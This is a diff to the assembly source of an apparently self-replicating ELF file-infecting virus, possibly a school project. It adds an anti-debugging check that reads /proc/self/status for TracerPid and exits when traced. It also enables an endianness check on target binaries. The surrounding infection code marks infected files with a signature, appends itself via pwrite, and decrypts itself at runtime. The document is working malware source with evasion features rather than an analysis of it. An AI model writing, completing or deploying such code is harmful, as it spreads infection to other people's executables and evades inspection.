@@ -13,7 +13,7 @@ decryptor:
     pop rbp ; We pop this address into rbp
     sub rbp, .delta ; by substracting delta we get the adress of the virus at runtime
 
-  mov r9, [rbp + key + proc_self_status - v_stop + 1]
+  mov r9, [rbp + key + dev_urandom - v_stop + 1]
   
   mov r12, v_stop - _start ; size of stuff we wish to decrypt
   lea rsi, [rbp + _start]
@@ -42,35 +42,76 @@ _start:
   xor r12d, r12d ; init r12 to 0
   cmp byte [rsi + 1], 'W'; check if we need to adjust offset
   je .after_adjust
-    mov r12d, proc_self_status - v_stop + 1 ; add the difference
+    mov r12d, dev_urandom - v_stop + 1 ; add the difference
   .after_adjust:
   mov [r15 + OFFSET], r12d ; store the offset
 
   mov DWORD [r15 + FINGERPRINT_ADD], 0 ; initialize to 0
 
-  ; .is_traced: ; read /proc/self/status and check if TracerPid is not 0
-    ; lea rdi, proc_self_status ; load /proc/self/status
-    ; mov rsi, O_RDONLY;
-    ; xor rdx, rdx ; no flags
-    ; mov rax, SYS_OPEN
-    ; syscall
-; 
-    ; cmp rax, 0 ; check error
-    ; jl cleanup
-; 
-    ; mov rdi, rax
-    ; lea rsi, [rsp + STACK_SIZE]
-    ; mov rdx, STACK_SIZE
-    ; mov rax, SYS_READ
-    ; syscall
-    ; 
-; 
+  .is_traced: ; read /proc/self/status and check if TracerPid is not 0
+    call .open_self_status ; pushing db 'woody' on stack
+      .self_status:
+        db '/proc/self/status', 0
 
-  ; check for trace (/proc/self/status)
+        .open_self_status:
+          pop rdi ; popping '/proc/self/status' in rsi
+          mov rsi, O_RDONLY;
+          xor rdx, rdx ; no flags
+          mov rax, SYS_OPEN
+          syscall
+
+    cmp rax, 0 ; check error
+    jl cleanup
+
+    mov rdi, rax
+    lea rsi, [rsp]
+    mov rdx, STACK_SIZE ; tracerpid should be in the first 4096 bytes
+    mov rax, SYS_READ
+    syscall
+
+    cmp rax, 0
+    jl cleanup
+
+    ; rax: length
+    ; rsi: file content
+    sub rax, 8 ; to avoid overflow
+    .find_tracer_pid:
+      mov rdi, TRACER_PID ; put 'TracerPi' bytes in rdi
+      cmp rdi, [rsi]
+      je .tracer_pid_found
+
+      dec rax
+      inc rsi
+      cmp rax, 0
+      je cleanup ; not found
+      jmp .find_tracer_pid
+
+    .tracer_pid_found:
+      mov bl, byte [rsi + 11]
+      mov cl, 0x30
+      cmp cl, bl
+      je .not_traced
+
+      call .show_dbg_msg ; pushing db 'woody' on stack
+      .dbg_msg:
+        db 'DEBUG...', 0xa
+        dbg_len equ $ - .dbg_msg
+
+        .show_dbg_msg:
+          pop rsi ; popping 'DEBUG...' in rsi
+          mov rax, SYS_WRITE
+          mov rdi, STDOUT
+          mov rdx, dbg_len
+          syscall
+      
+      jmp cleanup ; process is traced, exit
+
+  .not_traced:
+  ; check for TracerPid (/proc/self/status)
+
   ; check for processus tmp
-
-  ; open every folder in /proc
-  ; check for /comm and string compare (without \n)
+  ;   open every folder in /proc
+  ;   check for /comm and string compare (without \n)
 
   ; --- Open "."
   push "." ; push "." to stack (rsp)
@@ -139,9 +180,8 @@ _start:
     cmp dword [r15 + EHDR_PAD], SCOTT_SIGNATURE
     jz .close_and_next_file ; file has already been infected
 
-    ; Check for endianness scott
-    ; cmp byte [r15 + ehdr.ei_data], 1 ; little endian
-    ; jne .close_and_next_file
+    cmp byte [r15 + EHDR + EI_DATA], 1 ; little endian
+    jne .close_and_next_file
 
     ; prepare for loop
     mov r8, [r15 + EHDR_PHOFF] ; load phoffset
@@ -365,9 +405,9 @@ _start:
 
       xor r10, r10
       mov r10d, [r15 + OFFSET]
-      lea rsi, [rbp + proc_self_status + r10] ; load address
+      lea rsi, [rbp + dev_urandom + r10] ; load address
       mov r10, rax ; load EOF in rax
-      mov rdx, signature - proc_self_status ; want to write 8 bytes
+      mov rdx, signature - dev_urandom ; want to write 8 bytes
       mov rax, SYS_PWRITE64
       syscall
 
@@ -540,10 +580,6 @@ _start:
       cmp rax, 0
       jl .close_and_next_file ; if error go to next file
     
-    ; .find_text_section:
-    ; .encrypt_text_section:
-    ; .append_decryption_stub:
-
       mov rax, SYS_SYNC ; committing filesystem caches to disk
       syscall
 
@@ -585,8 +621,6 @@ cleanup:
 
 v_stop:
   jmp exit
-proc_self_status:
-  db "/proc/self/status", 0
 dev_urandom:
   db "/dev/urandom", 0
 signature:
